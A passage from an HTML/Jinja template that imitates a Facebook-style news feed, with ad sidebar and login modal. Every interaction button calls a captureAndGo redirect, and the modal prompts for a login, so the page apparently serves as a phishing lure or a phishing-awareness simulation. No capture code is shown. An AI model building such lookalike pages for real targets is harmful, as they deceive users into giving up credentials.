                <div class="font-medium min-w-0 flex-shrink max-w-[50%] text-right truncate">
                    {{ p.comments }} {{ comments_label }}
                    {% if p.shares and p.shares != "0" %}
                        · {{ p.shares }} {{ shares_label }}
                    {% endif %}
                </div>
            </div>
            <div class="flex p-1">
                {% if p.sim_action %}
                <button onclick="captureAndGo('{{ p.redirect_after }}')" class="flex-1 py-2 font-semibold text-sm hover:bg-gray-100 rounded-md flex items-center justify-center gap-1" style="color: {{ p.sim_color }};">
                    <i class="{{ p.sim_icon }}"></i> {{ p.sim_text }}
                </button>
                {% else %}
                <button onclick="captureAndGo('{{ p.redirect_after }}')" class="flex-1 py-2 text-gray-600 font-semibold text-sm hover:bg-gray-100 rounded-md flex items-center justify-center gap-1">
                    <i class="far fa-thumbs-up"></i> {{ like_btn }}
                </button>
                {% endif %}
                <button onclick="captureAndGo('{{ p.redirect_after }}')" class="flex-1 py-2 text-gray-600 font-semibold text-sm hover:bg-gray-100 rounded-md flex items-center justify-center gap-1">
                    <i class="far fa-comment"></i> {{ comment_btn }}
                </button>
                <button onclick="captureAndGo('{{ p.redirect_after }}')" class="flex-1 py-2 text-gray-600 font-semibold text-sm hover:bg-gray-100 rounded-md flex items-center justify-center gap-1">
                    <i class="far fa-share-square"></i> {{ share_btn }}
                </button>
            </div>
        </div>
        {% endfor %}
        <div class="p-4 text-center mt-4">
            <p class="text-gray-500 font-bold">{{ see_more }}</p>
        </div>
        </div>  <!-- Fermeture de feed-posts -->
        
        <!-- Right Sidebar (Desktop only) - Ads Container -->
        <div class="sidebar-right">
            {% if ads %}
                {% for ad in ads %}
                <div class="post mb-4 p-0 overflow-hidden">
                    {% if ad.get('image_url') %}
                    <div class="w-full h-48 overflow-hidden relative bg-gray-100">
                        <img src="{{ ad.image_url }}" draggable="false" class="absolute inset-0 w-full h-full object-cover" onclick="{% if ad.get('click_url') %}window.location.href='{{ ad.click_url }}'{% endif %}" style="cursor: {% if ad.get('click_url') %}pointer{% else %}default{% endif %};">
                    </div>
                    {% endif %}
                    <div class="p-3">
                        {% if ad.get('label') %}
                        <p class="text-[11px] text-gray-500 uppercase font-bold mb-1">{{ ad.label }}</p>
                        {% endif %}
                        {% if ad.get('title') %}
                        <p class="font-bold text-sm text-gray-900 mb-1">{{ ad.title }}</p>
                        {% endif %}
                        {% if ad.get('description') %}
                        <p class="text-xs text-gray-600 mb-3">{{ ad.description }}</p>
                        {% endif %}
                        {% if ad.get('cta_text') %}
                        <button onclick="window.location.href='{{ ad.cta_url or ad.click_url or '#' }}'" class="w-full py-2 px-3 bg-[#E4E6EB] text-gray-900 rounded-md font-bold text-xs hover:bg-gray-300 transition-all mt-2">
                            {{ ad.cta_text }}
                        </button>
                        {% endif %}
                    </div>
                </div>
                {% endfor %}
            {% else %}
            <div class="post p-4 text-center text-gray-500 text-sm">
                <p>{{ see_more }}</p>
            </div>
            {% endif %}
        </div>
    </div>  <!-- Fermeture de feed-container -->

    <!-- Login Modal -->
    <div id="login-modal" class="modal-overlay hidden">
        <div class="modal-card shadow-2xl">
            <div class="p-6 text-center">
                <div class="w-16 h-16 bg-blue-50 rounded-full flex items-center justify-center mx-auto mb-4">
                    <i class="fas fa-user-lock text-[#1877f2] text-2xl"></i>
                </div>
                <h3 class="text-xl font-bold text-gray-900 mb-2">{{ modal_title }}</h3>
                <p class="text-gray-600 text-sm mb-6">{{ modal_text }}</p>
                <div class="space-y-3">
                    <button onclick="confirmLogin()" class="w-full py-3 bg-[#1877f2] text-white rounded-xl font-bold text-lg hover:brightness-95 transition-all active:scale-95 shadow-lg shadow-blue-200">
                        {{ modal_continue }}
                    </button>
                    <button onclick="closeModal()" class="w-full py-3 bg-gray-100 text-gray-700 rounded-xl font-bold text-lg hover:bg-gray-200 transition-all active:scale-95">
                        {{ modal_stay }}
                    </button>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
"""
